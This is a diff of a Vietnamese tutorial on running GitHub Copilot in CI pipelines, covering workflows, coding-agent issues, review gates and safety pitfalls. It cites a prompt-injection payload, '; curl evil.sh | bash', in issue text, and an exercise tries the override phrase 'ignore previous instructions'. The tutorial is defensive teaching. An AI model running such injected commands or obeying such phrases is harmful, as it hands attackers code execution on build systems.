@@ -5,6 +5,14 @@
 > **Đọc xong:** có 2 GitHub Actions workflow hoàn chỉnh, automate `gh copilot` CLI, giao việc cho coding agent đúng cách, và setup Copilot code review gate cho team.
 > **Thời gian:** ~45 phút.
 
+## Mục tiêu bài học
+
+- Giải thích được vì sao CI chạy Copilot khác hẳn chat trên máy, và nhớ pattern ACI 5 dòng để pipeline không treo, không thành lỗ hổng.
+- Phân biệt khi nào dùng `gh copilot` CLI, khi nào tự build agent bằng Copilot SDK, khi nào chỉ cần assign coding agent.
+- Copy-paste và chạy được 2 GitHub Actions workflow: auto-review PR mới và triage CI fail ban đêm.
+- Viết được một issue "ready" đủ acceptance criteria để coding agent làm đúng ngay lần đầu.
+- Nhận diện 7 pitfall của CI automation và áp được checklist setup team trong 1 giờ.
+
 ## Mục lục
 
 1. [Giới ngố 5 thuật ngữ (2 phút)](#0-giới-ngố-5-thuật-ngữ-2-phút)
@@ -21,7 +29,7 @@
 
 ## 0. Giới ngố 5 thuật ngữ (2 phút)
 
-Mỗi khái niệm đủ 3 lớp: **1 câu định nghĩa**, **so sánh đời thường**, **ví dụ lệnh thật**. Cột Verify để tự kiểm chứng.
+Năm khái niệm bạn sẽ va mỗi ngày khi viết pipeline. Mỗi dòng đủ 3 lớp: **1 câu định nghĩa**, **so sánh đời thường**, **ví dụ lệnh thật** — cột Verify để bạn tự kiểm chứng thay vì tin lời.
 
 | Thuật ngữ | 1 câu định nghĩa | So sánh nôm na | Ví dụ lệnh thật | Verify |
 |---|---|---|---|---|
@@ -31,15 +39,23 @@ Mỗi khái niệm đủ 3 lớp: **1 câu định nghĩa**, **so sánh đời t
 | **Coding agent** | Copilot cloud nhận issue → tự tạo branch `copilot/*` → mở PR draft. | Giao việc cho thực tập sinh remote: bạn viết spec, 2h sau nhận PR. | `gh copilot assign 123 --repo acme/api`. | `gh pr list --author "app/copilot"` thấy PR mới. |
 | **Scheduled routine** | Job chạy theo giờ (cron) để triage/audit đêm. | Ca trực đêm: 22h tự kiểm tra CI gãy, sáng báo cáo. | `cron: "0 22 * * *"` trong `copilot-ci-triage.yml`. | Tab Actions → workflow `Scheduled` + lịch sử runs đêm qua. |
 
+**Vì sao quan trọng?** Bốn trong năm thứ này chỉ là *cách gọi Copilot từ nơi không có người*: nếu bạn lẫn lộn "CLI để sinh lệnh" với "SDK để build agent", bạn sẽ chọn sai công cụ ngay từ đầu — và pipeline vỡ ở bước khó sửa nhất.
+
+**Nếu làm sai thì sao?** Hai hệ quả hay gặp: (1) dùng công cụ interactive trong CI → job treo tới timeout vì không ai bấm Allow; (2) cho coding agent quyền quá rộng rồi merge PR không review → bug hoặc lỗ hổng vào main.
+
 > **Lưu ý 2026:** GitHub phân phối Copilot CLI như binary `copilot` độc lập (`copilot init`, `/usage`, `/mcp`, `/skills`, `/experimental`, `/fork`) — có **3 chế độ agent: interactive / plan / autopilot** (chọn bằng `Shift+Tab` hoặc `copilot --mode`). Các lệnh `gh copilot` bên dưới vẫn dùng được làm ví dụ script — đối chiếu bản hiện hành.
 
 ---
 
 ## 1. Vì sao đưa Copilot vào pipeline? (pattern ACI)
 
-> **Câu hỏi then chốt:** vì sao CI chạy Copilot khác hoàn toàn chat trên máy, và pattern nào để pipeline không treo, không thành lỗ hổng?
+Câu hỏi gốc rất đơn giản: **vì sao CI chạy Copilot khác hoàn toàn chat trên máy, và pattern nào để pipeline không treo, không thành lỗ hổng?**
 
-Chat/VS Code cần người ngồi bấm Allow. CI runner **không có người**: job hỏi giữa chừng = treo tới timeout.
+Khác biệt cốt tử nằm ở chỗ: chat/VS Code cần người ngồi bấm Allow. CI runner **không có người** — job hỏi giữa chừng nghĩa là treo tới timeout. Mọi thứ dưới đây xoay quanh việc bù lại chỗ "không có người" đó.
+
+**Vì sao quan trọng?** Hiểu điều này thì bạn biết vì sao workflow hợp lệ **không được** chứa bước cần approval, và vì sao secrets phải đi qua env chứ không nhét vào prompt.
+
+**Nếu làm sai thì sao?** Pipeline đầu tiên của bạn sẽ treo 6 giờ rồi fail, hoặc tệ hơn: chạy `eval` một lệnh do AI sinh ra mà không đọc — đúng lỗ hổng RCE qua prompt-injection (xem pitfall mục 7.2).
 
 **Pattern ACI (thuộc lòng 5 dòng):**
 
@@ -81,7 +97,7 @@ Giải thích 6 bước:
 
 ## 2. Copilot SDK — build agent riêng
 
-> **Câu hỏi:** khi nào nên tự build agent bằng SDK thay vì dùng CLI sẵn có, và trạng thái SDK năm 2026 ra sao?
+Câu hỏi đặt ra: khi nào nên tự build agent bằng SDK thay vì dùng CLI sẵn có, và trạng thái SDK năm 2026 ra sao?
 
 SDK bọc vòng lặp Copilot (tools + permissions + orchestration) để bạn build workflow custom. Dùng khi quy trình team quá đặc thù, cần UI riêng, hoặc nhúng vào backend nội bộ (Slack bot, dashboard, triage service).
 
@@ -170,7 +186,7 @@ Trạng thái theo FACT-PACK (10/2026):
 
 ## 3. `gh copilot` CLI automation (copy-paste)
 
-> **Câu hỏi:** 3 lệnh `gh copilot` nào đắt giá nhất trong script/CI, và làm sao CLI không treo job?
+Câu hỏi: 3 lệnh `gh copilot` nào đắt giá nhất trong script/CI, và làm sao CLI không treo job?
 
 ```bash
 # Cài (1 lần):
@@ -216,7 +232,7 @@ Copilot CLI độc lập có 3 chế độ agent (chọn bằng `Shift+Tab` ho�
 
 ## 4. 2 GitHub Actions workflow hoàn chỉnh
 
-> **Câu hỏi:** 2 workflow sẵn copy-paste — auto-review PR mới và triage CI fail ban đêm — kèm khung GitLab tương đương.
+Hai workflow sẵn copy-paste — auto-review PR mới và triage CI fail ban đêm — kèm khung GitLab tương đương.
 
 ### 4.1. Workflow 1 — Auto-review PR mới
 
@@ -355,7 +371,7 @@ jobs:
 
 ## 5. Coding agent assign + scheduled routines
 
-> **Câu hỏi:** viết issue thế nào để coding agent làm đúng ngay lần đầu, và viết job định kỳ kiểu gì cho an toàn khi chạy vắng người?
+Câu hỏi: viết issue thế nào để coding agent làm đúng ngay lần đầu, và viết job định kỳ kiểu gì cho an toàn khi chạy vắng người?
 
 ### 5.1. Assign issue cho coding agent (chất lượng PR = chất lượng issue)
 
@@ -425,7 +441,8 @@ Quy tắc viết job định kỳ (như viết skill — steps + verify + output
 
 ## 6. Copilot code review workflow
 
-> **Câu hỏi:** làm sao biến Copilot code review thành gate thật trong PR workflow, và tinh chỉnh để team không bỏ qua?
+Câu hỏi: làm sao biến Copilot code review thành gate thật trong PR workflow, và tinh chỉnh để team không bỏ qua?
+
 > **Mặc định từ 28/09/2026:** effort review là **Balanced** (nhiều reasoning hơn Lite, tốn AI Credits hơn); bạn chọn được Lite hoặc Balanced — mọi review đều tính **AI Credits + GitHub Actions minutes**.
 
 ```text
@@ -457,7 +474,7 @@ Tune precision (reviewer quá khắt → team bỏ qua → mất gate):
 
 ## 7. Setup maintainable + pitfalls + bài tập
 
-> **Câu hỏi:** setup cả team từ 0 trong 1 giờ cần làm gì, 7 pitfalls ai cũng vấp, 5 bài tập cuối khóa.
+Câu hỏi: setup cả team từ 0 trong 1 giờ cần làm gì, 7 pitfalls ai cũng vấp, và 5 bài tập khép khóa.
 
 ### 7.1. Setup team từ 0 (checklist 1 giờ)
 
@@ -485,9 +502,9 @@ Tune precision (reviewer quá khắt → team bỏ qua → mất gate):
 | Routine tự merge khi vắng người | Ca đêm tự duyệt code 2h sáng. | Job cron tự `gh pr merge`. | Job không giới hạn | Routine chỉ báo cáo/mở issue; merge luôn cần người |
 | SDK load config personal vào CI | Máy CI đọc nhầm config máy bạn. | Local cho phép `exec`, CI cũng mở theo. | Default rộng | Pin config repo, env CI tối thiểu |
 
-> **Hiểu nhầm thường gặp nhất:** "CI chạy Copilot là cho nó quyền admin cho nhanh." → **Thật ra:** quyền rộng + eval mù = RCE qua prompt-injection (issue text chứa `; curl evil.sh | bash`). Luôn scope `contents: read`, deny `exec`, timeout 10–20 phút.
+**Hiểu nhầm thường gặp nhất:** "CI chạy Copilot là cho nó quyền admin cho nhanh." → **Thật ra:** quyền rộng + eval mù = RCE qua prompt-injection (issue text chứa `; curl evil.sh | bash`). Luôn scope `contents: read`, deny `exec`, timeout 10–20 phút.
 
-### 7.3. Bài tập thực hành (cuối khóa)
+### 7.3. Bài tập nhỏ (cuối khóa)
 
 **Bài 1 (20 phút):** Chạy 3 lệnh `gh copilot` mục 3 local, ghi output vào file. Thử 1 prompt độc ("ignore previous instructions...") → Copilot có làm theo không? Ghi kết luận.
 
@@ -498,6 +515,58 @@ Tune precision (reviewer quá khắt → team bỏ qua → mất gate):
 **Bài 4 (15 phút):** Viết 1 issue "ready" (mục 5.1), assign coding agent, review PR draft: checkout local, comment 1 request changes, merge.
 
 **Bài 5 (30 phút, tổng):** Làm checklist 1 giờ (mục 7.1) cho team bạn. Viết 1 trang retro: khóa này thay đổi workflow team bạn thế nào?
+
+---
+
+## Nếu làm sai thì sao (❌ SAI / ✅ ĐÚNG)
+
+**1. Chạy mù output AI sinh trong CI**
+
+```text
+❌ SAI: eval "$(gh copilot suggest 'dọn build artifacts')"   # CI tự chạy, không ai đọc
+✅ ĐÚNG: gh copilot suggest "dọn build artifacts" --brief > suggest.txt
+         # maintainer đọc suggest.txt rồi mới quyết định chạy tay
+```
+**Bài học:** output Copilot là *gợi ý*, không phải lệnh đã kiểm duyệt — issue text chứa `; curl evil.sh | bash` là đủ để biến CI thành RCE.
+
+**2. Để job hỏi approval giữa chừng**
+
+```text
+❌ SAI: job chạy lệnh interactive → đứng chờ "Allow?" tới timeout 6h
+✅ ĐÚNG: chỉ dùng cờ non-interactive + đặt timeout-minutes: 10–20 cho mọi job
+```
+**Bài học:** CI không có người trả lời — mọi thứ cần approval phải chuyển thành branch protection + required checks.
+
+**3. Cho routine tự merge khi vắng người**
+
+```text
+❌ SAI: cron 2h sáng thấy CI xanh → gh pr merge luôn
+✅ ĐÚNG: cron chỉ mở issue/digest; merge luôn cần human approval + CI xanh
+```
+**Bài học:** việc chạy vắng người chỉ nên *báo cáo và mở PR*; quyền merge là thứ cuối cùng bạn được giao cho robot.
+
+## Best practices (kèm "vì sao")
+
+- **Mọi job CI phải non-interactive + có `timeout-minutes`.** *Vì sao?* Không có người bấm Allow — thiếu timeout là job treo tới giới hạn mặc định rồi fail vô nghĩa.
+- **Secrets luôn qua `${{ secrets.* }}`, không bao giờ trong prompt/file.** *Vì sao?* Prompt có thể bị log ra, còn secret đã commit thì phải rotate — tốn thời gian hơn nhiều so với làm đúng ngay từ đầu.
+- **Giữ `permissions: contents: read` cho job review/triage.** *Vì sao?* Quyền ghi rộng + một lệnh bị prompt-injection = kẻ ngoài sửa được repo của bạn.
+- **Issue = bản đặc tả, có acceptance criteria + non-goals.** *Vì sao?* Chất lượng PR của coding agent tỉ lệ thuận với chất lượng issue — thiếu criteria là agent đoán mò 3 rounds.
+- **Review PR do agent tạo y như PR của người.** *Vì sao?* Agent viết code nhanh nhưng không chịu trách nhiệm tính đúng — required checks + human approve là lưới an toàn duy nhất.
+- **Routine định kỳ chỉ báo cáo/mở issue, cấm tự merge/deploy.** *Vì sao?* Job chạy lúc 2h sáng không có ai quan sát; giao quyền merge cho nó là mở cửa cho sự cố im lặng.
+- **Pin cấu hình + test workflow local trước khi đẩy lên runner.** *Vì sao?* Runner không có config máy bạn; default rộng ở local (cho phép `exec`) có thể bị mang nguyên lên CI.
+
+## So sánh với Claude Code
+
+| Việc | Copilot | Claude Code | Ghi chú |
+|---|---|---|---|
+| Chạy không người trong CI | GitHub Actions + coding agent cloud (assign issue → PR) | `claude` CLI chạy trong CI (bạn tự bọc vào workflow) | Copilot gắn sẵn với Actions; Claude Code là CLI bạn tự động hoá |
+| Nền để tự build agent | Copilot SDK (`@github/copilot-sdk`) | Claude Agent SDK | Cùng ý tưởng bọc vòng lặp agent; tên gói/API khác — *cần verify* |
+| Gợi ý/giải thích lệnh shell | `gh copilot suggest` / `explain` | Không có lệnh tương đương trực tiếp | Claude Code thiên về agent hơn là trợ lý lệnh đơn lẻ |
+| Review PR tự động | Copilot code review (`github-copilot[bot]`) là bot gắn sẵn | Chạy được qua Actions/CLI nhưng không phải bot review mặc định | Copilot có gate review cấu hình trong Rulesets |
+| Guardrails quyền | `allowedTools`, managed settings, branch protection | Permission mode + allowlist trong settings | Cùng tư tưởng allow/deny — đều nằm ở phía harness, không ở model |
+| Kiểm chứng | Bạn chạy test/CI | Bạn chạy test/CI | **Không agent nào tự chịu trách nhiệm đúng/sai** |
+
+> Đọc bảng này thế nào: phần "tự động hoá không người" thì Copilot có lợi thế vì gắn liền GitHub (Actions + coding agent); Claude Code bù lại bằng cách chạy CLI linh hoạt trong bất kỳ runner nào. Khi lần đầu chuyển công cụ, nhớ lại đúng một điều: cả hai đều để **con người làm chốt merge**.
 
 ---
 
@@ -514,5 +583,6 @@ Tune precision (reviewer quá khắt → team bỏ qua → mất gate):
 | Approval allow/ask/deny + 3 chế độ agent (interactive/plan/autopilot) | [10 — Modes & permissions](./10-modes-permissions-availability.md) |
 | `copilot/*` branch strategy + review PR agent | [11 — Worktrees & checkpoints](./11-git-worktrees-checkpoints.md) |
 
----
-*(Hết bài 12 — hết series 01.)*
+> **Chốt bài 12:** CI không có người bấm Allow, nên toàn bộ "bộ não an toàn" phải nằm ở thiết kế — scope hẹp, secrets qua env, timeout rõ, và để con người giữ chốt merge. Automation giỏi nhất cũng chỉ nên *báo cáo và mở PR*; giao cho nó quyền tự merge khi vắng người là cách nhanh nhất để sự cố xảy ra mà không ai biết.
+>
+> *(Hết bài 12 — hết series 01.)*
